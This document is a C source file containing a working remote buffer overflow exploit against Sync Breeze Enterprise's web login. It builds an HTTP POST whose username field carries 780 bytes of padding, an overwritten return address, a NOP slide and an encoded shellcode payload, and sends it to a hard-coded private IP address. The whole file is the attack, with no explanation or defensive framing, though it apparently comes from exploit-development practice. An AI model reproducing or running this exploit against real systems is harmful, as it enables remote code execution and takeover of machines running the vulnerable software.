/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.190.152");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.190.152r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.190.152/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xd9\xc1\xd9\x74\x24\xf4\x5f\x31\xc9\xba\xef\x6f\xde\x43"
    "\xb1\x52\x83\xef\xfc\x31\x57\x13\x03\xb8\x7c\x3c\xb6\xba"
    "\x6b\x42\x39\x42\x6c\x23\xb3\xa7\x5d\x63\xa7\xac\xce\x53"
    "\xa3\xe0\xe2\x18\xe1\x10\x70\x6c\x2e\x17\x31\xdb\x08\x16"
    "\xc2\x70\x68\x39\x40\x8b\xbd\x99\x79\x44\xb0\xd8\xbe\xb9"
    "\x39\x88\x17\xb5\xec\x3c\x13\x83\x2c\xb7\x6f\x05\x35\x24"
    "\x27\x24\x14\xfb\x33\x7f\xb6\xfa\x90\x0b\xff\xe4\xf5\x36"
    "\x49\x9f\xce\xcd\x48\x49\x1f\x2d\xe6\xb4\xaf\xdc\xf6\xf1"
    "\x08\x3f\x8d\x0b\x6b\xc2\x96\xc8\x11\x18\x12\xca\xb2\xeb"
    "\x84\x36\x42\x3f\x52\xbd\x48\xf4\x10\x99\x4c\x0b\xf4\x92"
    "\x69\x80\xfb\x74\xf8\xd2\xdf\x50\xa0\x81\x7e\xc1\x0c\x67"
    "\x7e\x11\xef\xd8\xda\x5a\x02\x0c\x57\x01\x4b\xe1\x5a\xb9"
    "\x8b\x6d\xec\xca\xb9\x32\x46\x44\xf2\xbb\x40\x93\xf5\x91"
    "\x35\x0b\x08\x1a\x46\x02\xcf\x4e\x16\x3c\xe6\xee\xfd\xbc"
    "\x07\x3b\x51\xec\xa7\x94\x12\x5c\x08\x45\xfb\xb6\x87\xba"
    "\x1b\xb9\x4d\xd3\xb6\x40\x06\x1c\xee\xf4\x53\xf4\xed\x08"
    "\x5d\xbe\x7b\xee\x37\xd0\x2d\xb9\xaf\x49\x74\x31\x51\x95"
    "\xa2\x3c\x51\x1d\x41\xc1\x1c\xd6\x2c\xd1\xc9\x16\x7b\x8b"
    "\x5c\x28\x51\xa3\x03\xbb\x3e\x33\x4d\xa0\xe8\x64\x1a\x16"
    "\xe1\xe0\xb6\x01\x5b\x16\x4b\xd7\xa4\x92\x90\x24\x2a\x1b"
    "\x54\x10\x08\x0b\xa0\x99\x14\x7f\x7c\xcc\xc2\x29\x3a\xa6"
    "\xa4\x83\x94\x15\x6f\x43\x60\x56\xb0\x15\x6d\xb3\x46\xf9"
    "\xdc\x6a\x1f\x06\xd0\xfa\x97\x7f\x0c\x9b\x58\xaa\x94\xbb"
    "\xba\x7e\xe1\x53\x63\xeb\x48\x3e\x94\xc6\x8f\x47\x17\xe2"
    "\x6f\xbc\x07\x87\x6a\xf8\x8f\x74\x07\x91\x65\x7a\xb4\x92"
    "\xaf";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}